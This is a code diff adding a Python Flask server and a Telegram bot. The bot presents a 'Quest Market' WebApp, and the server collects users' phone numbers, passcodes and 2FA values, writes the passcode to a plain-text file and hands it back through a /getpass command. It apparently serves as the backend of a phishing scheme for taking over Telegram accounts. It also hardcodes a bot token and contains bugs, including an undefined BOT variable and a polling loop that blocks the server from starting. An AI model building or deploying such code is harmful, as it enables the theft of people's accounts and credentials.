@@ -1,4 +1,10 @@
+import telebot
 from flask import Flask, request, jsonify
+import json
+from telebot import types
+
+TOKEN = "8501545065:AAGgYCuf0tOj-uc74hE9YlDJJJHojbKztrA"
+WEBAPP_URL = "https://fairusss.github.io/tgbot/"
 
 app = Flask(__name__)
 
@@ -6,13 +12,89 @@ app = Flask(__name__)
 def index():
     return "WebApp працює!"
 
-@app.route('/api/data', methods=['GET','POST']) 
+@app.route('/api/data', methods=['GET','POST'])
 def receive_data():
     data = request.get_json()
-    print("Отримано JSON:", data)
-    print("Passcode:", data.get('passcode'))
-    return "OK"
+    passcode = data.get("passcode")
 
-if __name__ == '__main__':
+    if not passcode:
+        return jsonify({"error": "no passcode"}), 400
+
+    # Save passcode to temp file
+    with open("temp_passcode.txt", "w") as f:
+        f.write(passcode)
+
+    print(f"[SERVER] Passcode received and saved: {passcode}")
+
+    # Read back (just to verify)
+    with open("temp_passcode.txt", "r") as f:
+        saved = f.read()
+        print(f"[SERVER] File contents: {saved}")
+
+    return jsonify({"status": "ok", "saved": saved})
+
+
+bot = telebot.TeleBot(TOKEN)
+# /start — показує кнопку з WebApp
+@bot.message_handler(commands=['start'])
+def start(message):
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton(
+            text="Відкрити WebApp",
+            web_app=types.WebAppInfo(url=WEBAPP_URL)
+        )
+    )
+    bot.send_message(
+        message.chat.id,
+        "Привіт! Натисни, щоб відкрити Quest Market:",
+        reply_markup=markup
+    )
+
+# Отримання номера телефону з WebApp
+@bot.message_handler(content_types=['contact'])
+def handle_webapp_data(message):
+    data = message.contact.phone_number
+
+    print(data)
+    bot.send_message(message.chat.id, f"Отримано номер: {data}")
+
+# 🟢 AJAX endpoint — WebApp sends passcode / 2FA here
+@app.route("/submit_data", methods=["POST"])
+def submit_data():
+    try:
+        data = request.get_json()
+        action = data.get("action")
+        value = data.get("value")
+        user_id = data.get("user_id")
+
+        print(f"Received from WebApp: {action} = {value}")
+
+        # Optionally send confirmation message to Telegram chat
+        if user_id:
+            BOT.send_message(user_id, f"✅ Got {action}: {value}")
+
+        return jsonify(success=True, message="Data received"), 200
+    except Exception as e:
+        print("Error:", e)
+        return jsonify(success=False, message=str(e)), 400
+
+@bot.message_handler(commands=['getpass'])
+def get_pass(message):
+    try:
+        with open("temp_passcode.txt", "r") as f:
+            saved = f.read()
+        bot.send_message(message.chat.id, f"📄 Saved passcode: {saved}")
+    except FileNotFoundError:
+        bot.send_message(message.chat.id, "❌ No passcode saved yet.")
+
+print("Бот запущено! Очікуємо дані...")
+
+
+
+bot.infinity_polling()  
+
+if __name__ == "__main__":
     port = 12345
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host="0.0.0.0", port=port) 
+    
